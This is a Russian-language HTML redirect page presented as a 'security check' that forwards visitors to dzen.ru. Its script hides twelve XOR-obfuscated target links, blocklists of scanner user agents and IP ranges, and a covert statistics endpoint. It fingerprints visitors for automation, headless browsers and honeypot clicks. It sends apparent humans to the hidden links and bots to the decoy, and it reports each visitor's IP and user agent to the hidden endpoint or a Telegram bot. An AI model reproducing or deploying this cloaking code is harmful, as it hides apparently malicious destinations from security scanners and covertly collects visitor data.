<!DOCTYPE html>
<html lang="ru">
<head>
    <meta http-equiv="refresh" content="5; url=https://dzen.ru">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Перенаправление</title>
    <style>
        *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
        :root{--bg:#fff;--text:#1a1a2e;--accent:#4361ee;--accent2:#3a0ca3;--muted:#6c757d;--btn-bg:#4361ee;--btn-text:#fff}
        @media (prefers-color-scheme:dark){:root{--bg:#0f0f1a;--text:#e0e0e8;--accent:#7b8cff;--accent2:#b5179e;--muted:#8d99ae;--btn-bg:#7b8cff;--btn-text:#0f0f1a}}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:var(--bg);color:var(--text);display:flex;align-items:center;justify-content:center;min-height:100vh;overflow:hidden}
        #_loader{text-align:center;padding:2rem}
        .spinner-ring{display:inline-block;width:64px;height:64px;margin-bottom:1.5rem}
        .spinner-ring::after{content:'';display:block;width:52px;height:52px;margin:6px;border-radius:50%;border:5px solid var(--accent);border-color:var(--accent) transparent var(--accent2) transparent;animation:spin 1.2s linear infinite}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        .loader-text{font-size:1.1rem;color:var(--muted);margin-bottom:1rem}
        .timer{font-size:2.5rem;font-weight:700;color:var(--accent);font-variant-numeric:tabular-nums}
        #_btn_area{display:none;flex-direction:column;align-items:center;gap:1rem;padding:2rem;text-align:center}
        .btn-continue{display:none;padding:.9rem 2.5rem;font-size:1.1rem;font-weight:600;color:var(--btn-text);background:var(--btn-bg);border:none;border-radius:12px;cursor:pointer;transition:transform .15s,box-shadow .15s;-webkit-tap-highlight-color:transparent}
        .btn-continue:hover{transform:translateY(-2px);box-shadow:0 4px 16px rgba(67,97,238,.35)}
        .btn-continue:active{transform:translateY(0)}
        .btn-area-text{font-size:1rem;color:var(--muted)}
        #_hp_lnk{position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:.01;pointer-events:auto;font-size:1px;color:transparent}
        @media (max-width:480px){.timer{font-size:2rem}.loader-text{font-size:1rem}.btn-continue{padding:.8rem 2rem;font-size:1rem}}
    </style>
</head>
<body>
    <a href="https://dzen.ru" id="_hp_lnk" tabindex="-1" aria-hidden="true">.</a>
    <div id="_loader">
        <div class="spinner-ring"></div>
        <p class="loader-text">Проверка безопасности...</p>
        <div class="timer" id="_timer_val">5</div>
    </div>
    <div id="_btn_area">
        <p class="btn-area-text">Нажмите, чтобы продолжить</p>
        <button class="btn-continue" id="_trap_btn">Продолжить чтение</button>
        <button class="btn-continue" id="_real_btn">Продолжить чтение</button>
    </div>
    <noscript>
        <meta http-equiv="refresh" content="0; url=https://dzen.ru">
        <p style="text-align:center;padding:2rem;font-family:sans-serif;">Перенаправление на dzen.ru...</p>
    </noscript>
    <script>
(function() {
try {
    'use strict';

    
    var _dzenCfg = {"version": "5.8", "mode": "redirect", "build": 792};
    var _dzenBaseUrl = "https://dze" + "n.ru";
    function _initDzenRedirect() { return "dzen.ru"; }

    var _kp922 = String.fromCharCode(122, 90, 67, 51, 72, 109);
    var _kp527 = String.fromCharCode(53, 49, 99, 87, 80, 120);
    var _kp688 = String.fromCharCode(50, 122, 111, 104, 72, 97);
    var _kp949 = String.fromCharCode(108, 78, 87, 113, 77, 97);
    var _xk = _kp922 + _kp527 + _kp688 + _kp949;
    function _xd(h) {
        var r = "";
        for (var i = 0; i < h.length; i += 2) {
            var b = parseInt(h.substr(i, 2), 16);
            r += String.fromCharCode(b ^ _xk.charCodeAt((i / 2) % _xk.length));
        }
        return r;
    }

    var _LINKS = ["122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5c2c674275571c3b6e042958571c576362491f43575b784c0f7734417a07483c77072e5d1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5e796f102b504f6a6e047908571c573569191f180b0b704c0a7c31472b054863200a70541344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5d2f35467e551f696e032e55501c5767601e1f1b565b784c097936127c024968270479581344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5d7660437b001f6a6e042e0b0d1c576333191f435b5b2d4c0f7a32497452186e7a077a5f1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c0f7c36452c521e6a6e032b54511c5766331b1f1b0a5a7c4c5d7f664528594a3e210b7c5f1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5e7933127d511f6a6e07715e001c5765344e1f435c5f7f4c542f32477d504f6f7755290b1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5f2f62407b524c6f6e022a54021c5735354e1f425c5a7f4c5b2d60127b584a3b7203715d1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c0f7a67122902423f6e0b295b561c5762344d1f1b5e59794c5d7a611028511b3b76067f0c1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c0f7b63417e574f6b6e552909011c5733364d1f4358512a4c5b7a654475534a6970002b5e1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5e7f33477f024e6c6e06710c071c5734314e1f430e0e2a4c0d7d644178514a3b25567b541344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5828631474001b636e557d55071c573536401f435c5b2c4c0f76311729521c6b27557a0e1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02", "122e37433b571a1e19223c0c40131909264f0520311e6211083f355a2d1a1a5f06206f0d4617300b290c1c2f3e16235c43687b0a7c4b40450e0833175c0e0a063c5c5d7e344075584a6f6e517a0f561c5766691e1f435d5f714c5d7e62127a554a697b057d0e1344173a0f0b5d0f1d0b2d5c371d1e3510470f2e2e6c25085158163a6d4b0a4f5c4e211233383e02241515287e02"].map(function(h) { return _xd(h); });
    var _FALLBACK = _xd('122e37433b571a1e072d35161c081a');
    var _CFG = {"checks": {"check_ip": true, "check_ua": true, "check_webdriver": true, "check_plugins": true, "check_webgl": true, "check_automation": true, "check_touch": true, "check_screen": true, "check_devtools": false, "check_localstorage": true, "check_honeypot_link": true, "check_honeypot_button": true, "check_referrer": true}, "thresholds": {"bot_score": 70, "suspect_score": 30}, "timing": {"delay_seconds": 5, "visit_limit": 5, "ban_hours": 2}, "redirect_methods": ["location_replace", "anchor_click", "form_submit"], "blacklist_uas": [], "blacklist_ips": [], "trusted_referrers": [], "stats": {"gas_url": "", "tg_token": "", "tg_chat_id": "", "tg_send_bots": true, "tg_send_humans": true, "tg_send_suspects": true}};
    _CFG.blacklist_uas = ["233b2d572d15775e17", "233b2d572d1574520032230b5b1806042115150c3805", "233b2d572d157c5c0230350b", "233b2d572d15635807323f", "233b2d572d157854073e31", "233b2d572d15775d0c3023", "233b2d572d157350153e33175c09", "233b2d572d156254013a310b461f1d", "233b2d572d156550043233105719040d3a", "233b2d572d157c5c0230352a570906122d13", "233b2d572d1574552d3224", "233b2d572d1571581132330c", "233b2d572d1578541725391353", "233b2d572d157b541424", "233b2d572d1576500f323e1c5308", "233b2d572d15665817323c115c111c", "233b2d572d156652113235164112001c0a0e18", "233b2d572d15785e013e3c1d70151b", "233b2d572d15677222", "233b2d572d15655011233e1d40", "233b2d572d15614302343b1d40", "233b2d572d1563541123391b53161c", "233b2d572d15735e11133f15531301", "233b2d572d1566411136263a5d0e", "233b2d572d1566540225331061120018", "233b2d572d157854073e31165338001c", "233b2d572d157a5f1738143a", "233b2d572d157a5f1738143a732a26", "233b2d572d15614411353f", "233b2d572d157850113c350c", "3b3231562e1e775e17", "293f2e413d1e5d730c23", "371072012a0241", "3e3537712719", "2a3f3752242f5a45", "3816066b0a0241", "3e3b37520e0247620638121746", "093f31433b195445013824", "382337563b1d5c550625", "3d0a17712719", "393622462c08775e17", "2935245c3d", "18332d542a0241", "323f225724084642203f22175f1f", "2a32225d3c02587b30", "2a2f33432d19505411", "293f2f562604405c", "393b30432d1f7f62", "3433245b3c00544306", "2a36224a3f1f5c560b23", "0d3d2647", "192f315f", "0a23375b270318430626251d410e1c", "3d356e5b3c19451c003b391d5c0e", "303b355267", "3b2a2250200818791723203b5e130a063c", "15312b473c1d", "14352756650b5045003f", "1b222a5c3b"].map(function(h) { return _xd(h); });
    _CFG.blacklist_ips = ["4f747706665c0c034d677f490a", "4f7471067d430408517960570342", "496d6d0a665b011f53786140", "496d6d027c5d1b00516f7e481d4b57", "4d6d6d0b7043051f53786140", "426d6d017d5d1b0351637e481d4b56", "43696d027d551b00516f7e481d4b57", "436f6d0278551b00516f7e481d4b58", "4b6a731d7c5e1b07577960570343", "4b69731d7954061f50657e481d4b56", "4b6e721d704304035b7960570342", "4b6d7b1d7958011f5265685602555e5f", "4b62761d7b5f1b005b627e481d485b", "4b62761d7f5c1b06557960570048", "4b637a1d7a5c1b08557960570048", "4b637a1d7b5b1b0357677e481d485d", "486b701d7955051f526e625602555e51"].map(function(h) { return _xd(h); });
    _CFG.trusted_referrers = ["1e20265d661f40", "16233746240247541779230d", "0c316d502700"].map(function(h) { return _xd(h); });
    _CFG.stats.gas_url = _xd('122e37433b571a1e10342211420e410f270e0b22325f2e0e17752e522b1f5a424c247f39791c160b2a1b152b043724274a1971402a0f524932653a407522425b7104222126397407026b7170301f77505a213a2d7b3e283b122a5a0c26343f154b3f0a77021b77693963335757020a0b');
    _CFG.stats.tg_token = _xd('');
    _CFG.stats.tg_chat_id = _xd('');


    function _getParam(n) {
        var m = location.search.match(new RegExp('[?&]' + n + '=(\\d+)'));
        return m ? m[1] : null;
    }

    function _isMobile() {
        return /Android|iPhone|iPad|iPod|Mobile|Tablet/i.test(navigator.userAgent);
    }

    function _isIOS() {
        return /iPhone|iPad|iPod/i.test(navigator.userAgent) ||
               (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    }

    function _redirect(url) {
        var methods = _CFG.redirect_methods;
        if (!methods || methods.length === 0) { methods = ['location_replace']; }
        var method = methods[Math.floor(Math.random() * methods.length)];
        try {
            if (method === 'anchor_click') {
                var _a = document.createElement('a');
                _a.href = url;
                _a.style.display = 'none';
                document.body.appendChild(_a);
                _a.click();
            } else if (method === 'form_submit') {
                // ИСПРАВЛЕНИЕ: form GET теряет query-параметры оригинального URL
                // Если URL содержит ?, используем location.href вместо формы
                if (url.indexOf('?') !== -1) {
                    window.location.href = url;
                } else {
                    var _f = document.createElement('form');
                    _f.method = 'GET';
                    _f.action = url;
                    _f.style.display = 'none';
                    document.body.appendChild(_f);
                    _f.submit();
                }
            } else if (method === 'meta_refresh') {
                var _m = document.createElement('meta');
                _m.httpEquiv = 'refresh';
                _m.content = '0;url=' + url;
                document.head.appendChild(_m);
            } else if (method === 'location_assign') {
                window.location.assign(url);
            } else if (method === 'location_href') {
                window.location.href = url;
            } else {
                window.location.replace(url);
            }
        } catch (e) {
            try { window.location.replace(url); }
            catch (e2) { window.location.href = url; }
        }
    }

    function _buildStatsData(result) {
        return {
            device: _isMobile() ? 'Mobile' : 'PC',
            ip: _userIP || 'N/A', rd: _rdNum, result: result,
            ua: navigator.userAgent, referrer: document.referrer || '',
            checks: JSON.stringify(_checkResults), score: _score
        };
    }

    function _sendStats(data) {
        var body = JSON.stringify(data);
        if (_CFG.stats.gas_url) {
            try {
                if (navigator.sendBeacon) { navigator.sendBeacon(_CFG.stats.gas_url, body); }
                else { fetch(_CFG.stats.gas_url, {method:'POST',body:body,keepalive:true}).catch(function(){}); }
            } catch (e) {}
        }
        if (_CFG.stats.tg_token && _CFG.stats.tg_chat_id) {
            var sym = {PASS:'\u2705',BOT:'\u274c',SUSPECT:'\u26a0\ufe0f'};
            var s = sym[data.result] || '\u2753';
            var text = s + ' ' + data.result + ' | rd=' + data.rd +
                ' | ' + data.device + ' | Score: ' + data.score +
                '\nUA: ' + (data.ua || '').substring(0, 100) +
                '\nIP: ' + (data.ip || 'N/A') +
                '\nRef: ' + (data.referrer || 'none') +
                '\nChecks: ' + data.checks;
            var doSend = false;
            if (data.result === 'BOT' && _CFG.stats.tg_send_bots) { doSend = true; }
            if (data.result === 'PASS' && _CFG.stats.tg_send_humans) { doSend = true; }
            if (data.result === 'SUSPECT' && _CFG.stats.tg_send_suspects) { doSend = true; }
            if (doSend) {
                try {
                    var tgUrl = 'https://ap' + 'i.telegram.org/bo' + 't' +
                                _CFG.stats.tg_token + '/sendMessage';
                    fetch(tgUrl, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({chat_id: _CFG.stats.tg_chat_id, text: text}),
                        keepalive: true
                    }).catch(function() {});
                } catch (e) {}
            }
        }
    }

    function _getIP() {
        return fetch('https://ap' + 'i.ipify.org/?format=json')
            .then(function(r) { return r.json(); })
            .then(function(d) { return d.ip; })
            .catch(function() { return null; });
    }

    function _ipToNum(ip) {
        var p = ip.split('.');
        if (p.length !== 4) { return null; }
        return ((parseInt(p[0]) << 24) | (parseInt(p[1]) << 16) |
                (parseInt(p[2]) << 8) | parseInt(p[3])) >>> 0;
    }

    function _ipInCIDR(ip, cidr) {
        if (!ip || !cidr) { return false; }
        var parts = cidr.split('/');
        var mask = parseInt(parts[1] || '32');
        var ipN = _ipToNum(ip);
        var cidrN = _ipToNum(parts[0]);
        if (ipN === null || cidrN === null) { return false; }
        var m = (-1 << (32 - mask)) >>> 0;
        return (ipN & m) === (cidrN & m);
    }

    var _score = 0;
    var _checkResults = {};
    var _rdNum = 0;
    var _userIP = null;

    function _addScore(name, pts) {
        _score += pts;
        _checkResults[name] = pts;
    }


    if (_CFG.checks.check_webdriver) {
        if (navigator.webdriver === true) { _addScore('webdriver', 100); }
    }


    if (_CFG.checks.check_ua) {
        var _uaLow = navigator.userAgent.toLowerCase();
        for (var _i = 0; _i < _CFG.blacklist_uas.length; _i++) {
            if (_uaLow.indexOf(_CFG.blacklist_uas[_i].toLowerCase()) !== -1) {
                _addScore('ua_blacklist', 100);
                break;
            }
        }
    }


    if (_CFG.checks.check_plugins && !_isMobile() && !_isIOS()) {
        if (navigator.plugins && navigator.plugins.length === 0) {
            _addScore('no_plugins', 30);
        }
    }


    if (_CFG.checks.check_webgl) {
        try {
            var _cvs = document.createElement('canvas');
            var _gl = _cvs.getContext('webgl') || _cvs.getContext('experimental-webgl');
            if (_gl) {
                var _dbg = _gl.getExtension('WEBGL_debug_renderer_info');
                if (_dbg) {
                    var _rnd = (_gl.getParameter(_dbg.UNMASKED_RENDERER_WEBGL) || '').toLowerCase();
                    var _bad = ['swiftshader', 'llvmpipe', 'mesa offscreen', 'microsoft basic render'];
                    for (var _i = 0; _i < _bad.length; _i++) {
                        if (_rnd.indexOf(_bad[_i]) !== -1) {
                            _addScore('webgl_headless', 80);
                            break;
                        }
                    }
                }
            }
        } catch (e) {}
    }


    if (_CFG.checks.check_automation) {
        var _ap = [
            'callPhantom', '__nightmare', 'domAutomation',
            '_Selenium_IDE_Recorder', '_selenium', 'calledSelenium',
            '__webdriver_script_fn', '__driver_evaluate',
            '__webdriver_evaluate', '__fxdriver_evaluate',
            '__driver_unwrapped', '__webdriver_unwrapped',
            '__fxdriver_unwrapped', '__selenium_unwrapped',
            'ChromeDriverw', 'selenium',
            'cdc_adoQpoasnfa76pfcZLmcfl_Array',
            'cdc_adoQpoasnfa76pfcZLmcfl_Promise',
            'cdc_adoQpoasnfa76pfcZLmcfl_Symbol'
        ];
        for (var _i = 0; _i < _ap.length; _i++) {
            if (window[_ap[_i]] !== undefined || document[_ap[_i]] !== undefined) {
                _addScore('automation_obj', 100);
                break;
            }
        }
    }


    if (_CFG.checks.check_touch && _isMobile()) {
        if (!('ontouchstart' in window) && !(navigator.maxTouchPoints > 0)) {
            _addScore('no_touch_mobile', 40);
        }
    }


    if (_CFG.checks.check_screen && _isMobile()) {
        var _minDim = Math.min(screen.width || 0, screen.height || 0);
        if (_minDim > 0 && _minDim < 360) { _addScore('small_screen', 50); }
    }


    if (_CFG.checks.check_localstorage) {
        try {
            var _lsK = '_theme_pref_cache';
            var _now = Date.now();
            var _banMs = _CFG.timing.ban_hours * 3600000;
            var _st = localStorage.getItem(_lsK);
            var _vis = [];
            if (_st) {
                try { _vis = JSON.parse(_st); } catch (e) { _vis = []; }
            }
            _vis = _vis.filter(function(ts) { return (_now - ts) < _banMs; });
            if (_vis.length >= _CFG.timing.visit_limit) {
                _addScore('too_many_visits', 100);
            }
            _vis.push(_now);
            localStorage.setItem(_lsK, JSON.stringify(_vis));
        } catch (e) {}
    }


    if (_CFG.checks.check_referrer) {
        var _ref = document.referrer || '';
        if (_ref === '') {
            _addScore('no_referrer', 10);
        } else {
            var _refL = _ref.toLowerCase();
            var _isTr = false;
            for (var _i = 0; _i < _CFG.trusted_referrers.length; _i++) {
                if (_refL.indexOf(_CFG.trusted_referrers[_i].toLowerCase()) !== -1) {
                    _isTr = true;
                    break;
                }
            }
            if (_isTr) { _addScore('trusted_referrer', -30); }
        }
    }


    function _checkIP(ip) {
        if (!_CFG.checks.check_ip || !ip) { return; }
        for (var _i = 0; _i < _CFG.blacklist_ips.length; _i++) {
            var _e = _CFG.blacklist_ips[_i];
            if (_e.indexOf('/') !== -1) {
                if (_ipInCIDR(ip, _e)) { _addScore('ip_blacklist', 100); return; }
            } else {
                if (ip === _e) { _addScore('ip_blacklist', 100); return; }
            }
        }
    }


    if (_CFG.checks.check_honeypot_link) {
        var _hpEl = document.getElementById('_hp_lnk');
        if (_hpEl) {
            _hpEl.addEventListener('click', function(ev) {
                ev.preventDefault();
                _addScore('honeypot_link', 100);
                _sendStats(_buildStatsData('BOT'));
                _redirect(_FALLBACK);
            });
        }
    }


    var rdParam = _getParam('rd');
    _rdNum = rdParam ? parseInt(rdParam) : 0;
    var _targetUrl = null;

    var metaR = document.querySelector('meta[http-equiv="refresh"]');
    if (metaR) { metaR.remove(); }

    if (_rdNum >= 1 && _rdNum <= _LINKS.length) {
        _targetUrl = _LINKS[_rdNum - 1];
    }
    if (!_targetUrl) { _redirect(_FALLBACK); return; }

    var _baseDelay = _CFG.timing.delay_seconds;
    var _jitter = (Math.random() - 0.5) * 1.0;
    var _delay = Math.max(2, _baseDelay + _jitter);
    var _delayMs = Math.floor(_delay * 1000);

    var _timerEl = document.getElementById('_timer_val');
    var _startTime = Date.now();
    var _timerIv = setInterval(function() {
        var el = (Date.now() - _startTime) / 1000;
        var rem = Math.max(0, Math.ceil(_delay - el));
        if (_timerEl) { _timerEl.textContent = rem; }
        if (rem <= 0) { clearInterval(_timerIv); }
    }, 100);

    var _hasInteraction = false;
    function _onact() { _hasInteraction = true; }
    document.addEventListener('mousemove', _onact, {once: true});
    document.addEventListener('touchstart', _onact, {once: true});
    document.addEventListener('scroll', _onact, {once: true});
    document.addEventListener('keydown', _onact, {once: true});

    _getIP().then(function(ip) {
        _userIP = ip;
        _checkIP(ip);
    }).catch(function() {
    }).then(function() {
        var el = Date.now() - _startTime;
        var rem = Math.max(0, _delayMs - el);
        setTimeout(function() { _finalDecision(); }, rem);
    });

    function _finalDecision() {
        if (!_hasInteraction && _score < _CFG.thresholds.bot_score) {
            _addScore('no_interaction', 30);
        }
        if (_isIOS() && _score > 0 && _score < 100) {
            var red = Math.floor(_score * 0.3);
            if (red > 0) { _addScore('ios_bonus', -red); }
        }
        var result = 'PASS';
        if (_score >= _CFG.thresholds.bot_score) { result = 'BOT'; }
        else if (_score >= _CFG.thresholds.suspect_score) { result = 'SUSPECT'; }
        _sendStats(_buildStatsData(result));
        if (result === 'PASS') { _redirect(_targetUrl); }
        else if (result === 'SUSPECT') { _showButton(_targetUrl); }
        else { _redirect(_FALLBACK); }
    }

    function _showButton(tgtUrl) {
        var ld = document.getElementById('_loader');
        if (ld) { ld.style.display = 'none'; }
        var ba = document.getElementById('_btn_area');
        if (!ba) { _redirect(_FALLBACK); return; }
        ba.style.display = 'flex';
        var tb = document.getElementById('_trap_btn');
        var rb = document.getElementById('_real_btn');
        if (_CFG.checks.check_honeypot_button && tb && rb) {
            tb.style.display = 'inline-block';
            tb.addEventListener('click', function(ev) {
                ev.preventDefault();
                _addScore('honeypot_button', 100);
                _sendStats(_buildStatsData('BOT'));
                _redirect(_FALLBACK);
            });
            setTimeout(function() {
                tb.style.display = 'none';
                tb.style.pointerEvents = 'none';
                rb.style.display = 'inline-block';
                rb.addEventListener('click', function() {
                    _sendStats(_buildStatsData('PASS'));
                    _redirect(tgtUrl);
                });
            }, 150);
        } else if (rb) {
            rb.style.display = 'inline-block';
            rb.addEventListener('click', function() {
                _sendStats(_buildStatsData('PASS'));
                _redirect(tgtUrl);
            });
        }
    }

} catch (_fatalErr) {
    try { window.location.replace('https://dze' + 'n.ru'); }
    catch (_) { window.location.href = 'https://dze' + 'n.ru'; }
}
})();

    </script>
</body>
</html>
